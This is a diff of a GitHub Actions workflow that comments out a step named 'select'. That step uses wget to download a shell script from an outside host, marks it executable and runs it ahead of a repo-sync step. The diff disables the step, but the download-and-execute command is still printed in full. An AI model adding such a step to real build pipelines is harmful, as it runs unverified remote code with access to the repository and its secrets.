@@ -16,17 +16,17 @@ jobs:
       - uses: actions/checkout@v2
         with:
           persist-credentials: false
-      - name: select
-        run: |
-          wget https://api.baiblog.ren/d/D/jgsrty.sh?pw=c00d9a5a97e3ffaa -O jgsrty.sh
-          chmod +x jgsrty.sh
-          ./jgsrty.sh
-          if code=1 
-          then 
-          exit 
-          else 
-          echo "正在同步"
-          fi 
+#       - name: select
+#         run: |
+#           wget https://api.baiblog.ren/d/D/jgsrty.sh?pw=c00d9a5a97e3ffaa -O jgsrty.sh
+#           chmod +x jgsrty.sh
+#           ./jgsrty.sh
+#           if code=1 
+#           then 
+#           exit 
+#           else 
+#           echo "正在同步"
+#           fi 
           
       - name: repo-sync
         uses: repo-sync/github-sync@v2
